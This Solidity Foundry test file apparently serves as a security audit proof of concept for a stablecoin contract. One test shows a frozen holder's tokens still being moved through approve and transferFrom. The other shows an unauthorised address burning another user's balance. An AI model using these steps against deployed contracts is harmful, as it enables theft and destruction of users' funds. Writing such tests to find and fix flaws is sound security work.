// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// testing freeze bypass and burn issue in stablecoin contract
import "forge-std/Test.sol";
import "./src/StableCoin.sol";

contract TestStableCoin is Test {
    StableCoin token;
    address owner = address(0x1);
    address frozenUser = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        vm.startPrank(owner); // simulate owner actions
        token = new StableCoin();
        token.mint(frozenUser, 1000 ether); // mint tokens to frozen user
        vm.stopPrank();
    }

    function testBypassFreeze() public {
        vm.prank(owner);
        token.freeze(frozenUser); // freeze the user

        vm.prank(frozenUser);
        token.approve(attacker, 500 ether); // user approves attacker to spend

        vm.prank(attacker);
        token.transferFrom(frozenUser, attacker, 500 ether); // attacker transfers tokens

        // attacker still gets the tokens even though frozenUser is frozen
        assertEq(token.balanceOf(attacker), 500 ether);
    }

    function testBurnWithoutPermission() public {
        vm.prank(attacker);
        token.burn(frozenUser, 500 ether); // attacker burns tokens from frozenUser

        // balance reduced without frozenUser approving or calling burn
        assertEq(token.balanceOf(frozenUser), 500 ether);
    }
}